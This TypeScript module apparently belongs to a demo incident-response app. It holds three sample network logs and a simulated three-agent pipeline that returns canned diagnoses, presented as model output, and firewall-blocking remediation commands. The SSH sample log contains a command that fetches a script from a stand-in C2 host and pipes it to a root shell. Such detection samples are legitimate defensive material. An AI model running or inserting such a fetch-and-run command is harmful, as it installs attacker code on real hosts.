export interface AgentStepResult {
  agentId: 'parser' | 'network' | 'secops';
  agentName: string;
  role: string;
  modelBadge: string;
  durationMs: number;
  status: 'idle' | 'running' | 'completed';
  summary: string;
  structuredOutput: Record<string, unknown>;
}

export interface OrchestrationReport {
  incidentId: string;
  timestamp: string;
  severity: 'CRÍTICA' | 'ALTA' | 'MÉDIA' | 'BAIXA';
  executiveSummary: string;
  rootCause: string;
  remediationCommands: { platform: string; command: string }[];
  agents: AgentStepResult[];
}

export const SAMPLE_LOGS = [
  {
    id: 'cisco-asa-ddos',
    title: 'Cisco ASA / Firewall — Flood SYN & Varredura de Portas',
    source: 'Cisco ASA 5516-X (Borda)',
    rawLog: `Nov 18 09:14:02 FW-EDGE-01 %ASA-4-733100: [ Drop] drop rate-1 exceeded. Current burst rate is 4820 per second, max configured rate is 1000; Current average rate is 3910 per second, max configured rate is 500; Cumulative total count is 184920
Nov 18 09:14:05 FW-EDGE-01 %ASA-2-106001: Inbound TCP connection denied from 185.220.101.44/54122 to 200.142.88.10/22 flags SYN on interface OUTSIDE
Nov 18 09:14:06 FW-EDGE-01 %ASA-2-106001: Inbound TCP connection denied from 185.220.101.44/54129 to 200.142.88.10/3389 flags SYN on interface OUTSIDE
Nov 18 09:14:08 FW-EDGE-01 %ASA-3-710003: TCP access denied by ACL from 185.220.101.44/54201 to outside:200.142.88.10/445
Nov 18 09:14:11 FW-EDGE-01 %ASA-4-419002: Duplicate TCP SYN from outside:185.220.101.44/54310 to inside:10.10.20.15/443 with different initial sequence number`
  },
  {
    id: 'linux-ssh-bruteforce',
    title: 'Ubuntu Server — Brute Force SSH + Escalação Sudo',
    source: 'srv-prod-linux-02 (auth.log)',
    rawLog: `Nov 18 03:41:12 srv-prod-linux-02 sshd[28411]: Failed password for invalid user admin from 45.155.205.93 port 49812 ssh2
Nov 18 03:41:14 srv-prod-linux-02 sshd[28411]: Failed password for invalid user deploy from 45.155.205.93 port 49814 ssh2
Nov 18 03:41:19 srv-prod-linux-02 sshd[28419]: Failed password for root from 45.155.205.93 port 49820 ssh2
Nov 18 03:42:01 srv-prod-linux-02 sshd[28455]: Accepted publickey for ops_backup from 45.155.205.93 port 50112 ssh2
Nov 18 03:42:18 srv-prod-linux-02 sudo: ops_backup : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl -s http://malicious-c2.example/payload.sh | sh`
  },
  {
    id: 'bgp-ospf-flap',
    title: 'Core Router — BGP Flap & Degradação DNS Interno',
    source: 'RTR-CORE-SP01 (Syslog)',
    rawLog: `Nov 18 08:50:11 RTR-CORE-SP01 %BGP-5-ADJCHANGE: neighbor 172.16.254.2 Down BGP Notification sent (Hold Timer Expired)
Nov 18 08:50:14 RTR-CORE-SP01 %OSPF-5-ADJCHG: Process 10, Nbr 10.255.0.4 on TenGigabitEthernet0/1/0 from FULL to DOWN, Neighbor Down: Dead timer expired
Nov 18 08:50:22 RTR-CORE-SP01 %DNS-3-QUERY_TIMEOUT: Upstream resolver 10.10.5.53 failed to respond within 2000ms (142 dropped queries/sec)
Nov 18 08:50:45 RTR-CORE-SP01 %LINEPROTO-5-UPDOWN: Line protocol on Interface TenGigabitEthernet0/1/0, changed state to down`
  }
];

function extractIps(text: string): string[] {
  const matches = text.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g);
  return matches ? Array.from(new Set(matches)) : [];
}

function extractPorts(text: string): string[] {
  const matches = text.match(/(?:\/|port\s+)(\d{1,5})\b/gi);
  if (!matches) return [];
  return Array.from(new Set(matches.map(m => m.replace(/[^0-9]/g, '')))).slice(0, 8);
}

export async function runMultiAgentPipeline(
  rawLog: string,
  webhookUrl: string,
  onStageUpdate: (stage: AgentStepResult) => void
): Promise<OrchestrationReport> {
  const ips = extractIps(rawLog);
  const ports = extractPorts(rawLog);
  const lines = rawLog.split('\n').filter(Boolean);
  const lower = rawLog.toLowerCase();

  const isBruteForce = lower.includes('failed password') || lower.includes('sudo');
  const isBgpFlap = lower.includes('bgp') || lower.includes('ospf') || lower.includes('hold timer');

  // AGENTE 1: PARSER & NORMALIZADOR
  const parserRunning: AgentStepResult = {
    agentId: 'parser',
    agentName: 'Agente 01 · Log Parser & Normalizer',
    role: 'Extração Estruturada (Regex + Schema JSON)',
    modelBadge: 'Gemini 2.5 Flash · JSON Mode',
    durationMs: 0,
    status: 'running',
    summary: 'Normalizando timestamps, extraindo endereços IPv4, portas de destino e assinaturas de eventos...',
    structuredOutput: {}
  };
  onStageUpdate(parserRunning);
  await new Promise(r => setTimeout(r, 650));

  const parserCompleted: AgentStepResult = {
    ...parserRunning,
    durationMs: 640,
    status: 'completed',
    summary: `${lines.length} eventos normalizados. Identificados ${ips.length} endereços IP únicos e ${ports.length} portas/serviços impactados.`,
    structuredOutput: {
      total_events: lines.length,
      extracted_ipv4: ips,
      target_ports: ports.length ? ports : ['N/A (Camada 2/3)'],
      protocol_family: isBgpFlap ? 'BGP / OSPF / DNS (UDP-53)' : 'TCP / IPv4',
      ingestion_status: 'VALID_SCHEMA'
    }
  };
  onStageUpdate(parserCompleted);

  // AGENTE 2: DIAGNÓSTICO DE REDES & INFRAESTRUTURA
  const netRunning: AgentStepResult = {
    agentId: 'network',
    agentName: 'Agente 02 · NetOps & OSI Diagnostic',
    role: 'Análise de Roteamento, Topologia e Camadas OSI',
    modelBadge: 'Claude 3.7 Sonnet · NetEng',
    durationMs: 0,
    status: 'running',
    summary: 'Correlacionando impacto nas camadas L2–L7, estado de interfaces e disponibilidade de serviços...',
    structuredOutput: {}
  };
  onStageUpdate(netRunning);
  await new Promise(r => setTimeout(r, 800));

  const netCompleted: AgentStepResult = {
    ...netRunning,
    durationMs: 790,
    status: 'completed',
    summary: isBgpFlap
      ? 'Queda física/enlace na TenGigabitEthernet0/1/0 derrubou adjacências OSPF e sessão BGP por expiração de Hold Timer, causando blackhole no DNS interno.'
      : isBruteForce
      ? 'Sessão SSH autenticada após múltiplas falhas sequenciais seguida de execução remota via curl|sh no host de produção.'
      : 'Saturação de tabela de estados (SYN Flood) excedendo em 382% o burst rate configurado na interface OUTSIDE do firewall de borda.',
    structuredOutput: {
      osi_layer_impacted: isBgpFlap ? 'L1/L2 (Physical/Link) -> L3 (BGP/OSPF)' : 'L4 (Transport) & L7 (Application)',
      blast_radius: isBgpFlap ? 'Core SP01 + Resolução DNS Corporativa' : isBruteForce ? 'Host srv-prod-linux-02 (Comprometimento Root)' : 'Perímetro Externo / NAT Pool',
      packet_loss_risk: isBgpFlap ? 'ALTO (Blackhole de rotas)' : 'MODERADO (Throttling ativo)'
    }
  };
  onStageUpdate(netCompleted);

  // AGENTE 3: SECOPS & RESPOSTA A INCIDENTES
  const secRunning: AgentStepResult = {
    agentId: 'secops',
    agentName: 'Agente 03 · SecOps & Remediation Architect',
    role: 'Classificação MITRE ATT&CK & Playbook de Contenção',
    modelBadge: 'GPT-4o · Security Reasoning',
    durationMs: 0,
    status: 'running',
    summary: 'Mapeando TTPs (MITRE ATT&CK), gerando regras de contenção e consolidando laudo executivo...',
    structuredOutput: {}
  };
  onStageUpdate(secRunning);
  await new Promise(r => setTimeout(r, 850));

  const attackerIp = ips[0] || '185.220.101.44';
  const secCompleted: AgentStepResult = {
    ...secRunning,
    durationMs: 840,
    status: 'completed',
    summary: isBgpFlap
      ? 'Falha operacional crítica de infraestrutura (sem indício de intrusão externa). Acionar redundância de link e verificar transceptor óptico SFP+.'
      : isBruteForce
      ? `Intrusão confirmada (MITRE T1110 Brute Force + T1059 Command Execution) originada de ${attackerIp}. Isolamento imediato exigido.`
      : `Reconhecimento ativo e SYN Flood (MITRE T1498 / T1046) originado de ${attackerIp}. Bloqueio em borda recomendado.`,
    structuredOutput: {
      mitre_attack: isBgpFlap ? 'N/A (Falha de Disponibilidade / Infraestrutura)' : isBruteForce ? 'T1110.001 + T1059.004' : 'T1498.001 (Direct Network Flood)',
      containment_priority: 'IMEDIATA (< 5 min)',
      webhook_dispatched: Boolean(webhookUrl.trim())
    }
  };
  onStageUpdate(secCompleted);

  // Se o usuário configurar um webhook real do n8n/Make, envia o payload estruturado
  if (webhookUrl.trim()) {
    try {
      await fetch(webhookUrl.trim(), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          source: 'NetPulse-AI-Orchestrator',
          timestamp: new Date().toISOString(),
          parser: parserCompleted.structuredOutput,
          network: netCompleted.structuredOutput,
          secops: secCompleted.structuredOutput
        })
      });
    } catch {
      // Mantém resiliência na demo caso CORS ou URL local bloqueie
    }
  }

  return {
    incidentId: `INC-${Math.floor(100000 + Math.random() * 900000)}`,
    timestamp: new Date().toLocaleString('pt-BR'),
    severity: isBruteForce || isBgpFlap ? 'CRÍTICA' : 'ALTA',
    executiveSummary: isBgpFlap
      ? 'Interrupção na interface TenGigabitEthernet0/1/0 provocou queda simultânea de OSPF e BGP no RTR-CORE-SP01, isolando o resolvedor DNS 10.10.5.53.'
      : isBruteForce
      ? `Comprometimento confirmado no servidor srv-prod-linux-02: após força bruta SSH a partir de ${attackerIp}, a conta ops_backup executou payload remoto como root.`
      : `Ataque de varredura multi-porta (22, 3389, 445) e SYN Flood detectado na borda Cisco ASA a partir de ${attackerIp}, atingindo 4.820 pps.`,
    rootCause: isBgpFlap
      ? 'Perda de sinal físico (Line Protocol Down) na porta 10GbE principal sem failover automático configurado para rotas DNS.'
      : isBruteForce
      ? 'Exposição da porta 22/TCP sem rate-limit/Fail2Ban e chave pública comprometida ou sem restrição de IP de origem para o usuário ops_backup.'
      : 'Ausência de bloqueio automático (shun/blackhole) na interface OUTSIDE para IPs que ultrapassam o threshold de SYN.',
    remediationCommands: isBgpFlap
      ? [
          { platform: 'Cisco IOS-XE (Core)', command: 'show interfaces TenGigabitEthernet0/1/0 transceiver detail\nconf t\n ip route 10.10.5.53 255.255.255.255 172.16.254.6 10' },
          { platform: 'Diagnóstico Linux NOC', command: 'mtr -rwzbc 20 10.10.5.53 && dig @10.10.5.53 internal.corp +time=1' }
        ]
      : isBruteForce
      ? [
          { platform: 'Ubuntu / Firewall UFW', command: `sudo ufw insert 1 deny from ${attackerIp} to any\nsudo usermod -L ops_backup && sudo pkill -KILL -u ops_backup` },
          { platform: 'Forense & Auditoria', command: 'sudo aureport -au --summary && sudo lastb -n 20' }
        ]
      : [
          { platform: 'Cisco ASA (Contenção)', command: `shun ${attackerIp}\naccess-list OUTSIDE_IN line 1 extended deny ip host ${attackerIp} any` },
          { platform: 'Linux Edge / iptables', command: `sudo iptables -I INPUT -s ${attackerIp} -j DROP && sudo netfilter-persistent save` }
        ],
    agents: [parserCompleted, netCompleted, secCompleted]
  };
}